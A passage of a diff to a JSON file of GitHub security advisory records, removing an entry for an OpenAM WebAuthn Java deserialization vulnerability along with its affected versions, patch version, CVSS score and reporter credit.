-        "type": "reporter"
-      }
-    ],
-    "cvss": {
-      "vector_string": null,
-      "score": null
-    }
-  },
-  {
-    "ghsa_id": "GHSA-6c99-87fr-6q7r",
-    "cve_id": "CVE-2026-45051",
-    "url": "https://api.github.com/advisories/GHSA-6c99-87fr-6q7r",
-    "html_url": "https://github.com/advisories/GHSA-6c99-87fr-6q7r",
-    "summary": "OpenAM: Pre-auth RCE via Java Deserialization in WebAuthn Authenticator Storage",
-    "description": "## Summary\n\n**Description**\n\nA deserialization of untrusted data vulnerability (CWE-502) exists in OpenAM's WebAuthn authentication module. Under certain conditions, this may allow an attacker to achieve arbitrary code execution in the context of the application server. This affects OpenAM Community Edition through version 16.0.6 and was patched in version 16.1.1.\n\nThis is not the default configuration. Exploitation requires that an attacker has previously been able to write attacker-controlled data to a storage attribute read by the WebAuthn module, and that the WebAuthn authentication flow is reachable.\n\n## Impact\nWebAuthn is a modern shipped module, but the vulnerable configuration requires either the default storage attribute to become attacker-writable, or the WebAuthn userAttribute to be set to an attacker-writable string attribute. That is not the default, but it is feasible in deployments because the product exposes the storage attribute as a free-form admin setting and does not warn or enforce that it must be server-managed and non-user-writable. This may exist through delegated administration, provisioning, write access to the backing LDAP/directory user record, legacy REST self-registration, or unsafe reconfiguration of `userAttribute`.\n\nIn any deployment where the attribute becomes user writable, an attacker can execute arbitrary code as the application server user. \n\n## Patch\nThis has been patched in OpenAM Community Edition version 16.1.1. Users are encouraged to update to the latest release.",
-    "type": "reviewed",
-    "severity": "critical",
-    "repository_advisory_url": "https://api.github.com/repos/OpenIdentityPlatform/OpenAM/security-advisories/GHSA-6c99-87fr-6q7r",
-    "source_code_location": "https://github.com/OpenIdentityPlatform/OpenAM",
-    "identifiers": [
-      {
-        "value": "GHSA-6c99-87fr-6q7r",
-        "type": "GHSA"
-      },
-      {
-        "value": "CVE-2026-45051",
-        "type": "CVE"
-      }
-    ],
-    "references": [
-      "https://github.com/OpenIdentityPlatform/OpenAM/security/advisories/GHSA-6c99-87fr-6q7r",
-      "https://github.com/advisories/GHSA-6c99-87fr-6q7r"
-    ],
-    "published_at": "2026-06-24T17:25:28Z",
-    "updated_at": "2026-06-24T17:25:29Z",
-    "github_reviewed_at": "2026-06-24T17:25:28Z",
-    "nvd_published_at": null,
-    "withdrawn_at": null,
-    "vulnerabilities": [
-      {
-        "package": {
-          "ecosystem": "maven",
-          "name": "org.openidentityplatform.openam:openam-auth-webauthn"
-        },
-        "vulnerable_version_range": "<= 16.0.6",
-        "first_patched_version": "16.1.1",
-        "vulnerable_functions": [
-
-        ]
-      }
-    ],
-    "cvss_severities": {
-      "cvss_v3": {
-        "vector_string": null,
-        "score": 0.0
-      },
-      "cvss_v4": {
-        "vector_string": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N",
-        "score": 9.2
-      }
-    },
-    "cwes": [
-      {
-        "cwe_id": "CWE-502",
-        "name": "Deserialization of Untrusted Data"
-      }
-    ],
-    "credits": [
-      {
-        "user": {
-          "login": "wodzen",
-          "id": 25558174,
-          "node_id": "MDQ6VXNlcjI1NTU4MTc0",
-          "avatar_url": "https://avatars.githubusercontent.com/u/25558174?v=4",
-          "gravatar_id": "",
-          "url": "https://api.github.com/users/wodzen",
-          "html_url": "https://github.com/wodzen",
-          "followers_url": "https://api.github.com/users/wodzen/followers",
-          "following_url": "https://api.github.com/users/wodzen/following{/other_user}",
-          "gists_url": "https://api.github.com/users/wodzen/gists{/gist_id}",
-          "starred_url": "https://api.github.com/users/wodzen/starred{/owner}{/repo}",
-          "subscriptions_url": "https://api.github.com/users/wodzen/subscriptions",
-          "organizations_url": "https://api.github.com/users/wodzen/orgs",
-          "repos_url": "https://api.github.com/users/wodzen/repos",
-          "events_url": "https://api.github.com/users/wodzen/events{/privacy}",
-          "received_events_url": "https://api.github.com/users/wodzen/received_events",
-          "type": "User",
-          "user_view_type": "public",
-          "site_admin": false
-        },
-        "type": "reporter"
-      }
-    ],
-    "cvss": {
-      "vector_string": null,
-      "score": null
+      "percentile": 0.3354
     }
   }
 ]
